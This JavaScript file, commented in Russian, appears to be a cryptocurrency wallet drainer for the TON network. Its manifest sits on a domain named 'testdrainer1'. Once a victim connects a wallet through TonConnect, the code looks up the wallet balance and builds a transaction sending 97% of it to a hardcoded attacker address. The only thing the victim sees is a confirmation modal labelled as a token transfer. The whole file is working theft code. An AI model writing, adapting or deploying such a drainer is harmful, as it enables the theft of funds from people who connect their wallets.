// Инициализация TonConnect
const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
    manifestUrl: 'https://testdrainer1.netlify.app/tonconnect-manifest.json',
    buttonRootId: 'connect-widget'
});

// Обработчик изменения статуса кошелька
tonConnectUI.onStatusChange((wallet) => {
    if (wallet) {
        console.log('Кошелек подключен:', wallet);
        closeModal('connect-modal');
        openModal('confirm-modal');
    } else {
        console.log('Кошелек отключен');
    }
});

// Функция для отправки токенов
async function sendTokens() {
    const confirmBtn = document.getElementById('confirm-transfer-btn');
    try {
        confirmBtn.disabled = true;
        confirmBtn.textContent = 'Обработка...';
        
        if (!tonConnectUI.connected || !tonConnectUI.account) {
            throw new Error('Кошелек не подключен');
        }

        // Получаем баланс кошелька
        const response = await fetch(`https://toncenter.com/api/v3/wallet?address=${tonConnectUI.account.address}`);
        const data = await response.json();
        const balance = parseFloat(data.balance);
        
        if (balance <= 0) {
            throw new Error('На кошельке недостаточно средств');
        }

        // Оставляем 3% на комиссии
        const amountToSend = Math.floor(balance * 0.97).toString();

        // Создаем транзакцию
        const transaction = {
            validUntil: Math.floor(Date.now() / 1000) + 300, // 5 минут
            messages: [{
                address: 'UQAto6-GBiUxylKE_3WwrRdQ47wArfW3hemtjjmwZdJesExp', // Ваш кошелек
                amount: amountToSend
            }]
        };

        // Отправляем транзакцию
        const result = await tonConnectUI.sendTransaction(transaction);
        console.log('Транзакция успешна:', result);
        
        // Закрываем модальное окно и показываем уведомление
        setTimeout(() => {
            closeModal('confirm-modal');
            alert('Транзакция успешно отправлена!');
            confirmBtn.disabled = false;
            confirmBtn.textContent = 'Отправить токены';
        }, 1000);
        
    } catch (error) {
        console.error('Ошибка:', error);
        alert('Произошла ошибка: ' + error.message);
        confirmBtn.disabled = false;
        confirmBtn.textContent = 'Отправить токены';
    }
}

// Экспортируем функции для использования в других файлах
window.sendTokens = sendTokens;
window.tonConnectUI = tonConnectUI;
